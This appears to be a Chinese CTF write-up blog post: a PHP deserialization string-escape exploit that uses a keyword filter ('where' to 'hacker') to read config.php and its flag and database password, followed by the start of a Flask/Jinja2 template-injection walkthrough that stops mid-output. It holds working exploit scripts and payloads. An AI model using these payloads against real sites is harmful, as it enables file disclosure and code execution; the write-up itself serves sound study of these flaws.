<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意到profile.php界面是将这些变量直接输出的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin-top:100px&quot;</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;img-memeda &quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:180px;margin:0px auto;&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>Hi &lt;?php echo $nickname;?&gt;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">label</span>&gt;</span>Phone: &lt;?php echo $phone;?&gt;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">label</span>&gt;</span>Email: &lt;?php echo $email;?&gt;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">//update.php</span><br><span class="line">&lt;?</span><br><span class="line">		$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];</span><br><span class="line">		$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];</span><br><span class="line">		$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];</span><br><span class="line">		$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">//这里进行了一次反序列化，调用update_profile函数，在class.php里面有写出来</span><br><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &#x27;$username&#x27;&quot;;</span><br><span class="line">		return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">//filter函数：</span><br><span class="line">public function filter($string) &#123;</span><br><span class="line">		$escape = array(&#x27;\&#x27;&#x27;, &#x27;\\\\&#x27;);</span><br><span class="line">		$escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;;</span><br><span class="line">		$string = preg_replace($escape, &#x27;_&#x27;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">		$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line">		return preg_replace($safe, &#x27;hacker&#x27;, $string);</span><br><span class="line">	&#125;</span><br><span class="line">我们注意到会把$safe名单里面的函数全部替换成hacker，此时，只有where是五个字节，而其他的都是6个字节，可以利用此一个字节的差异构造链子来进行序列化使之达到我们想要的文件包含。</span><br><span class="line">    </span><br><span class="line">//profile.php</span><br><span class="line">&lt;?</span><br><span class="line">    </span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[&#x27;phone&#x27;];</span><br><span class="line">		$email = $profile[&#x27;email&#x27;];</span><br><span class="line">		$nickname = $profile[&#x27;nickname&#x27;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));</span><br><span class="line">//两次对$profile进行了序列化与反序列化，可能存在利用</span><br><span class="line"></span><br><span class="line">//我们想要的链子：			&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><span class="line">//这样的话，图片那边的文件链接就会连接到本地的config.php从而打开此文件，实现文件包含</span><br><span class="line">//想要的链子长度：33个字节</span><br><span class="line">//因为一个此preg_replace只能多出来一个字符，所以我们需要构造33个where来换取33个字节的溢出，实现我们的序列化正常修改成我们想要的数据</span><br><span class="line"></span><br><span class="line">//利用代码</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function filter($string) &#123;</span><br><span class="line">    $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">    $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($safe, &#x27;hacker&#x27;, $string);</span><br><span class="line">&#125;</span><br><span class="line">$profile[&#x27;phone&#x27;]=&#x27;12345678901&#x27;;</span><br><span class="line">$profile[&#x27;email&#x27;]=&#x27;lionelkkk@qq.com&#x27;;</span><br><span class="line">$profile[&#x27;nickname&#x27;]=&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;;</span><br><span class="line">$profile[&#x27;photo&#x27;] =&#x27;ffgfgfgf&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a=serialize($profile);</span><br><span class="line">echo $a.&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$b=filter($a);</span><br><span class="line">echo $b.&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$b=unserialize($b);</span><br><span class="line">var_dump($b);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//输出</span><br><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:16:&quot;lionelkkk@qq.com&quot;;s:8:&quot;nickname&quot;;s:198:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:8:&quot;ffgfgfgf&quot;;&#125;</span><br><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:16:&quot;lionelkkk@qq.com&quot;;s:8:&quot;nickname&quot;;s:198:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:8:&quot;ffgfgfgf&quot;;&#125;</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;phone&quot;]=&gt;</span><br><span class="line">  string(11) &quot;12345678901&quot;</span><br><span class="line">  [&quot;email&quot;]=&gt;</span><br><span class="line">  string(16) &quot;lionelkkk@qq.com&quot;</span><br><span class="line">  [&quot;nickname&quot;]=&gt;</span><br><span class="line">  string(198) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span><br><span class="line">  [&quot;photo&quot;]=&gt;</span><br><span class="line">  string(10) &quot;config.php&quot;</span><br><span class="line">&#125;</span><br><span class="line">//但是很快发现对变量$nickname有一个长度限制，所以我们抓包的时候将变量nickname[]改成此数组的形式可以绕开长度的限制。</span><br><span class="line">if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;);</span><br><span class="line">//因此，我们的利用链也需要同步进行更新</span><br><span class="line"></span><br><span class="line">//分析一个数组的序列化</span><br><span class="line">s:3:&quot;arr&quot;;a:2:&#123;s:1:&quot;w&quot;;s:5:&quot;wwwww&quot;;s:1:&quot;k&quot;;s:5:&quot;kkkkk&quot;;&#125;</span><br><span class="line">//注意到是有  &#125;  的,所以我们构造链子的时候只需要在;后面加一个  &#125;  就行,因为链子多了一个字符，所以我们的where同理也需要再增加一个,再次发包update.php页面，然后查看profile.php页面查看源代码就可以看到图片src被替换成了config.php文件的base64内容,转一下base64解码就可以看到flag</span><br><span class="line">    &quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><span class="line">    </span><br><span class="line">PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFnezZlZmNhYmQ1LWQzYjctNGM4Zi04NGNmLWQ1NWVmYmJiYzEzOH0nOwo/Pgo=</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;;</span><br><span class="line">$config[&#x27;username&#x27;] = &#x27;root&#x27;;</span><br><span class="line">$config[&#x27;password&#x27;] = &#x27;qwertyuiop&#x27;;</span><br><span class="line">$config[&#x27;database&#x27;] = &#x27;challenges&#x27;;</span><br><span class="line">$flag = &#x27;flag&#123;6efcabd5-d3b7-4c8f-84cf-d55efbbbc138&#125;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="2-XCTF—-WP"><a href="#2-XCTF—-WP" class="headerlink" title="2.XCTF—-WP"></a>2.XCTF—-WP</h1><h2 id="1-Web-python-template-injection"><a href="#1-Web-python-template-injection" class="headerlink" title="1.Web_python_template_injection"></a>1.Web_python_template_injection</h2><p>D:\blog\pict\webflask1.png</p>
<p>D:\blog\pict\webflask2.png</p>
<p>如上可以看出是模板注入，在此处大括号中执行代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  <span class="comment">#返回类型所属的对象</span></span><br><span class="line">__mro__    <span class="comment">#返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span></span><br><span class="line">__base__   <span class="comment">#返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的</span></span><br><span class="line"></span><br><span class="line">__subclasses__   <span class="comment">#每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span></span><br><span class="line">__init__  <span class="comment">#类的初始化方法</span></span><br><span class="line">__globals__  <span class="comment">#对包含函数全局变量的字典的引用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>寻找可用引用</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>D:\blog\pict\webflask3.png</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">warnings</span>.<span class="title">WarningMessage</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">warnings</span>.<span class="title">catch_warnings</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_weakrefset</span>.<span class="title">_IterationGuard</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_weakrefset</span>.<span class="title">WeakSet</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Hashable</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">classmethod</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Iterable</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Sized</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Container</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">_abcoll</span>.<span class="title">Callable</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">dict_keys</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">dict_items</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">dict_values</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">_Printer</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">_Helper</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_sre</span>.<span class="title">SRE_Pattern</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_sre</span>.<span class="title">SRE_Match</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_sre</span>.<span class="title">SRE_Scanner</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">site</span>.<span class="title">Quitter</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">codecs</span>.<span class="title">IncrementalEncoder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">codecs</span>.<span class="title">IncrementalDecoder</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">functools</span>.<span class="title">partial</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">operator</span>.<span class="title">itemgetter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">operator</span>.<span class="title">attrgetter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">operator</span>.<span class="title">methodcaller</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">collections</span>.<span class="title">deque</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">deque_iterator</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">deque_reverse_iterator</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">combinations</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">combinations_with_replacement</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">cycle</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">dropwhile</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">takewhile</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">islice</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">starmap</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">imap</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">chain</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">compress</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">ifilter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">ifilterfalse</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">count</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">izip</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">izip_longest</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">permutations</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">product</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">repeat</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">groupby</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">tee_dataobject</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">tee</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">itertools</span>.<span class="title">_grouper</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_thread</span>.<span class="title">_localdummy</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">thread</span>.<span class="title">_local</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">thread</span>.<span class="title">lock</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">Struct</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_json</span>.<span class="title">Scanner</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_json</span>.<span class="title">Encoder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">json</span>.<span class="title">decoder</span>.<span class="title">JSONDecoder</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">json</span>.<span class="title">encoder</span>.<span class="title">JSONEncoder</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">time</span>.<span class="title">struct_time</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">threading</span>.<span class="title">_Verbose</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">cPickle</span>.<span class="title">Unpickler</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">cPickle</span>.<span class="title">Pickler</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">cStringIO</span>.<span class="title">StringO</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">cStringIO</span>.<span class="title">StringI</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">string</span>.<span class="title">Template</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">string</span>.<span class="title">Formatter</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ssl</span>.<span class="title">_SSLContext</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_ssl</span>.<span class="title">_SSLSocket</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">socket</span>.<span class="title">_closedsocket</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_socket</span>.<span class="title">socket</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">method_descriptor</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">socket</span>.<span class="title">_socketobject</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">socket</span>.<span class="title">_fileobject</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">urlparse</span>.<span class="title">ResultMixin</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">contextlib</span>.<span class="title">GeneratorContextManager</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">contextlib</span>.<span class="title">closing</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">MissingType</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">LRUCache</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">Cycler</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">Joiner</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">utils</span>.<span class="title">Namespace</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">markupsafe</span>.<span class="title">_MarkupEscapeHelper</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">nodes</span>.<span class="title">EvalContext</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_hashlib</span>.<span class="title">HASH</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">nodes</span>.<span class="title">Node</span>&#x27;&gt;, &lt;<span class="title">type</span> &#x27;<span class="title">_random</span>.<span class="title">Random</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">runtime</span>.<span class="title">TemplateReference</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">jinja2</span>.<span class="title">environment</span>.<span class="title">Environment</span>&#x27;&gt;, &lt;<span 